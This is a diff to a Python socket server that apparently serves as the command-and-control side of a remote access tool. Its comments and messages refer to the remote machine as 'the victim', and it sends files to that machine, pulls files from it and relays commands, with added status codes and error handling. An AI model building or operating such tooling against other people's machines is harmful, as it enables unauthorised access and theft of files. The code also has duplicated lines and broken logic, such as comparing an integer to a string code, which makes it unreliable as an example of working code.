@@ -4,6 +4,12 @@ import json
 import os
 import json
 
+FILE_WAS_SENT = "100@"  # The file was sent
+CANT_OPEN_FILE = "200@"  # Cant open the file successfully
+COMMAND_NOT_FOUND = "300@"  # Cant open find the command
+CANT_OPEN_HANDLE = "400@"  # Cant open handle
+HANDLE_WAS_OPENED = "500@"  # Handle was opened successfully
+
 
 class Server:
     port = None
@@ -50,7 +56,12 @@ class Server:
 
         total_file_size = 0
         file_size = sock.recv(15).decode('utf-8', 'ignore')
-        file_size = int(file_size.rstrip("\x00"))
+        file_size = int(file_size.replace('$', ''))
+
+        if file_size == CANT_OPEN_FILE:
+            print("Cant open the file")
+            self.web_server_socket.send("Cant open the file".encode())
+            return
         print("File size is " + str(file_size))
 
         with open(path_to_save, 'wb')as f:
@@ -73,10 +84,15 @@ class Server:
 
     def send_file_to_client(self, path, sock):
         # Send to the victim files
-        self.web_server_socket.send("Whete do you want to save the file".encode())
+        self.web_server_socket.send("Where do you want to save the file".encode())
         victim_path = self.web_server_socket.recv(1024).decode()  # input('Where do you want save the file\n')
         print("victim path is " + json.loads(victim_path)[0])
         sock.send(json.loads(victim_path)[0].encode('utf-8'))
+
+        if sock.recv(4).decode() != HANDLE_WAS_OPENED:
+            self.web_server_socket.send("Cant open handle to the file".encode())
+            return
+
         file_size = str(os.path.getsize(path))
         if len(file_size) < 15:
             for i in range(len(file_size), 15):
@@ -91,6 +107,12 @@ class Server:
 
         f.close()
         f.close()
+
+        # self.web_server_socket.send(self.sock.recv(17))
+        if sock.recv(4).decode() != FILE_WAS_SENT:
+            self.web_server_socket.send("The file wasn't sent".encode())
+            return
+
         self.web_server_socket.send("The file was sent to the victim successfully!".encode())
 
     def get_command_from_server(self):
@@ -135,16 +157,23 @@ class Server:
 
         elif command.startswith("get files"):
             data = sock.recv(20)
+            data = data.replace(b'$', b'')
             try:
-                data = sock.recv(int(data.decode()))
-                self.web_server_socket.send(data)
+                data = sock.recv(int(data.decode())).decode()
+                # print("Get files size is " + data)
+                self.web_server_socket.send(data.encode())
                 print(data.decode())
-            except:
+            except Exception as e:
+                print(e)
                 print(data)
 
 
         elif command.startswith('send file'):
             command = command[10:-1] + command[-1]
+            # Checking if the file exist
+            if not os.path.isfile(command):
+                self.web_server_socket.send("This file is not exist!".encode())
+                return
             self.send_file_to_client(command, sock)
 
         elif command == 'exit':
@@ -175,4 +204,3 @@ class Server:
 
 myServer = Server(9087, '127.0.0.1', 1, 'client1')
 myServer.runThread()
-
